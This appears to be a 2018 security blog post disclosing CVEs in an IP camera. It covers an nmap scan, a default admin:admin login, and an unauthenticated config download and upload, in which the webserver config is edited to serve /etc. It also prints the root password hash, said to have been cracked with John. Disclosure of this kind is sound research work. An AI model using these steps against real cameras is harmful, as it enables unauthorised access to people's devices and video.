---
layout: post
title:	"Master IP CAM 01 Vulnerabilities"
date:	2018-01-15 21:00:00
categories:
    - blog
tags:
    - IoT
---

Some time ago I analized this ipcam with my friend [Dzonerzy](https://twitter.com/dzonerzy):

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img1.jpg)

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img2.jpg)

~~~
var serialNum="VVVIPCSBC150617Z-06929VjmJH54vkK";
var model="RT_IPC";
var hardVersion="5900-gc1004";
var softVersion="V3.3.4.2103-S50-SBC-B20150721E";
var ipcname="WIFICAM";
var startdate="2017-8-5 0:0:2";
var runtimes="0 day, 0:54";
var sdstatus="Ready";
var sdfreespace="3400608 ";
var sdtotalspace="3969024 ";
var builddate="Jul 20 2015 ";
var productmodel="null";
var vendor="RTJ";
var swver="";
var hwver="";
var mppver="mpp";
~~~

We found some vulnerabilities but we might find much more in the next days.

In this first article we will describe:

* [[CVE-2018-5724]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724) Unauthenticated Configuration Download and Upload
* [[CVE-2018-5723]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723) Hardcoded Password for Root Account 
* [[CVE-2018-5725]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725) Unauthenticated Configuration Change
* [[CVE-2018-5726]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726) Unauthenticated Sensitive Information Disclousure
* [[CVE-2019-8387]](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-8387) Remote Command Execution

I will update this post with the new vulnerabilities we will found.

## Introduction

First of all we ran nmap:

~~~
Stone:~ syrion$ nmap 192.168.1.124 -sV -sT -p 1-65535

Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-23 17:41 CET
Nmap scan report for 192.168.1.124
Host is up (0.026s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE        VERSION
23/tcp    open  telnet         BusyBox telnetd
80/tcp    open  http           thttpd 2.25b 29dec2003
554/tcp   open  rtsp           HiLinux IP camera rtspd V100R003 (VodServer 1.0.0)
1018/tcp  open  soap           gSOAP 2.8
1235/tcp  open  mosaicsyssvc1?
8840/tcp  open  rtsp
60075/tcp open  unknown

Service Info: Host: RT-IPC; Device: webcam

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.44 seconds
~~~

There were different services running on the camera but we started from the webapp.

There was a login page where we could login with admin:admin

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img3.png)

Obviously every request was in HTTP (LOL).

The web application had not so much functionality but after some researches on google we found [this](http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf) manual with a lot of cgi command like the one we found in our ipcam. 

## [CVE-2018-5724] Unauthenticated Configuration Download and Upload

We could download the configuration file:

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img7.png)

The first step was uncompressing the config_backup.bin file:

~~~
Stone:Desktop syrion$ tar xvf config_backup.bin 
~~~

 There were a lot of configuration files. But let's look at the webserver.conf:

~~~
port=80 user=root cgipat=cgi-bin/** nosymlink globalpasswd debug cgilimit=30
~~~

From nmap we knew the webserver was thttpd 2.25b 29dec2003, so after read the [manual](https://acme.com/software/thttpd/thttpd_man.html) we discovered how to change the root directory of the webserver, so we modified the configuration file as follow:

~~~
port=80 user=root dir=/etc/ nosymlink globalpasswd debug cgilimit=30
~~~

Ok at this point we only needed something to upload the new configuration file. The [manual](http://www.themadhermit.net/wp-content/uploads/2013/03/FI9821W-CGI-Commands.pdf) helped us again:

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img8.png)

It worked and after some minutes the ipcamera was online again:

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img9.png)

## [CVE-2018-5723] Hardcoded Password for Root Account 

Good, we got the passwd file with the password hash for user root:

~~~
root:$1$xFoO/s3I$zRQPwLG2yX1biU31a2wxN/:0:0::/root:/bin/sh
~~~

With John we cracked it:

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img10.png)

And yes, we got root:

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img11.png)

## [CVE-2018-5725] Unauthenticated Configuration Change

Without any authentication we could change the port where the server was running:

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img4.png)
![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img5.png)
![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img6.png)

## [CVE-2018-5726] Unauthenticated Sensitive Information Disclousure

That was so magic:

![Screenshot]({{ site.baseurl }}/images/2018-01-15-master-ipcam/img12.png)

### References

* [https://www.exploit-db.com/exploits/43693](https://www.exploit-db.com/exploits/43693/)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5723)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5724)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5725)
* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5726)

